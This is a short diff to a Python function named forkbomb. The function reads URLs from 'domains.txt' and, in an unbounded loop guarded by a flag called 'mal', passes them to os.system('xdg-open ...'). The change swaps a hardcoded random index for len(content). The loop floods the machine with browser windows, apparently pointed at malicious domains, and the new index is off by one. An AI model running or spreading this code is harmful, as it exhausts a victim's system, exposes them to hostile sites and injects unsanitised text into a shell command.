@@ -9,7 +9,7 @@ def forkbomb():
   else:
     file = open("domains.txt")
     content = file.readlines()
-    num = random.randint(0, 20118)
+    num = random.randint(0, len(content))
     while mal == True:
       os.system("xdg-open " + content[num])
       number += 1
